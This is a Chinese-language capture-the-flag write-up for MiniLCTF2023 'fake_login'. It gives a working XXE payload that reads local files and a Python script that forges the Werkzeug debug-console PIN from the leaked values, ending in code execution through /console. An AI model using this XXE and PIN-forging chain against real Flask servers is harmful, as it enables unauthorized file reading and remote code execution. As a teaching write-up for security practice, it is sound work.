# MiniLCTF2023 - fake_login

## 题目简述

页面是普通登录框，但前端实际向 `/login` 发送 XML。后端使用 `lxml.etree.XMLParser(recover=True)` 解析原始请求体，并把解析出的用户名拼进 JSON 错误信息；应用还以 Flask `debug=True` 启动。利用链是 XXE 任意文件读取，再收集 Werkzeug 调试 PIN 所需信息并进入 `/console` 执行 Python。

## 解题过程

先用外部实体读取文件。用户名会进入错误消息，因此实体内容可以直接回显：

```xml
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<user>
  <username>&xxe;</username>
  <password>anything</password>
</user>
```

题目中的 `/flag` 只提示必须进一步 RCE。利用同一原语读取调试 PIN 的六项输入：

```text
username:     /etc/passwd -> minictfer
module:       flask.app
app name:     Flask
module file:  /usr/local/lib/python3.9/site-packages/flask/app.py
MAC integer:  /sys/class/net/eth0/address 去冒号后转十进制
machine id:   /etc/machine-id；为空才改读 boot_id，并拼接 cgroup 末段
```

该容器的 `/proc/self/cgroup` 为 `0::/`，末段为空，不需要额外拼接。按 Python 3.9 对应 Werkzeug 版本的 SHA-1 算法计算：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    "minictfer",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.9/site-packages/flask/app.py",
]
private_bits = [
    "2485377892357",
    "0e3f1348-aaee-4680-ae33-6b3d626a9c91",
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if bit:
        h.update(bit.encode())

h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]
h.update(b"pinsalt")
number = f"{int(h.hexdigest(), 16):09d}"[:9]
pin = "-".join(number[i:i + 3] for i in range(0, 9, 3))
print(cookie_name, pin)
```

仓库记录的环境值会算出 `694-847-281`。访问 `/console`，输入 PIN 解锁后执行 `open('/flag').read()`；实际比赛环境会把占位 flag 替换为真值。原 WP 中 `"minictfer"` 后漏了逗号，会被 Python 与下一字符串静态拼接，本文已修正。

## 方法总结

任意文件读取只有与具体运行时信息结合才会升级为 RCE。计算 Flask/Werkzeug PIN 时，用户名、模块路径、Python/Flask 版本、MAC 和 machine-id 都必须来自目标，博客中的示例值不能照抄；哈希从旧版本的 MD5 变为新版本 SHA-1 也会改变结果。cgroup 为空后缀是合法状态，不应擅自换读无关文件。
